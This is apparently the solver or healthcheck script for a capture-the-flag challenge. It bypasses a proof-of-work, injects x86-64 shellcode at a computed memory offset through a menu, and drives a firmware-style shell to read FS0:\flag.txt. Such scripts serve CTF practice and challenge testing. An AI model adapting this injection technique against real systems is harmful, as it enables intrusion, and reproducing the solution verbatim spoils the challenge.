#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"

def solve():
	def handle_pow(r):
		print(r.recvuntil(b'python3 '))
		print(r.recvuntil(b' solve '))
		challenge = r.recvline().decode('ascii').strip()
		p = process(['kctf_bypass_pow', challenge])
		solution = p.readall().strip()
		r.sendline(solution)
		print(r.recvuntil(b'Correct\n'))

	p = remote('127.0.0.1', 1337)
	print(p.recvuntil(b'== proof-of-work: '))
	if p.recvline().startswith(b'enabled'):
		handle_pow(p)

	context.arch = "amd64"
	shellcode = b'H\x81\xc4\x88\x01\x00\x00[]_^A\\A]A^A_\xc3UNVARIANT'

	BASE = 0x2183013 - 0x1013
	offset = BASE + 0x128a
	log.info(f"{offset = :#x}")

	p.recvuntil(b"==[ Menu")
	p.sendafter(b": ", b"1\r")

	size = offset + len(shellcode)
	shellcode = shellcode.hex().upper().encode()
	print(shellcode)

	p.sendafter(b": ", f"{size}".encode() + b"\r")
	p.sendafter(b": ", b"4\r")
	p.sendafter(b": ", b"0\r")
	p.sendafter(b": ", f"{offset - 1}".encode() + b"\r")
	p.sendafter(b": ", shellcode + b"ZZ")

	p.recvuntil(b"current system")

	p.send(b"\x1b[B" * 2)
	p.send(b"\r")
	p.send(b"\x1b[B")
	p.send(b"\r")
	p.send(b" ")
	p.send(b"type FS0:\\flag.txt\r")

	confirm = p.recvuntil(b"malta", timeout=30)
	if b"malta" in confirm:
		exit(0)

for _ in range(64):
	try:
		solve()
	except EOFError:
		pass
exit(1)
